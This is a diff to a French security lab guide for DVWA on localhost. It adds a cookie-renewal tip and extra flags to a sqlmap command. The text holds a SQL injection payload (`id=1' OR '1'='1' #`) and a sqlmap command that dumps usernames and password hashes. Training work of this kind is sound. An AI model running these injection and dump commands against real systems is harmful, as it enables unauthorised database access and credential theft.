@@ -727,6 +727,12 @@ La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devi
 > La variable `security=low` désactive les fonctions de filtrage PHP (`mysql_real_escape_string()`, `htmlspecialchars()`) dans le code de DVWA. Sans `security=low`, l'injection est bloquée par le code lui-même.  
 > **En résumé :** le cookie = la clé d'entrée dans l'immeuble. L'injection SQL = ce qu'on fait une fois à l'intérieur. Les deux sont nécessaires.
 
+> 🔄 **Cookie expiré ?** Le cookie DVWA expire après quelques minutes d'inactivité. Pas besoin de refaire tout le LAB-2 — une commande suffit pour le renouveler :
+> ```bash
+> source env.sh && bash labs_resolution/jour-01/setup_dvwa.sh
+> ```
+> Ce script refait la connexion (extraction du token CSRF + login + security=low) et écrase `/tmp/dvwa_cookie.txt` avec un cookie frais.
+
 **Actions :**
 1. Envoyer une requête avec `id=1' OR '1'='1' #` (encodé en URL) au lieu de `id=1`
 2. Compter le nombre d'occurrences de "First name" dans la réponse
@@ -761,7 +767,7 @@ Au lieu de `1` (un seul utilisateur normalement). Le flag `-b` envoie le cookie 
 cd rendu_labs/jour-01
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --load-cookies=/tmp/dvwa_cookie.txt \
-  -D dvwa -T users -C user,password --dump --batch
+  -D dvwa -T users -C user,password --dump --batch --no-cast --threads=3
 ```
 
 **Résultat attendu :**
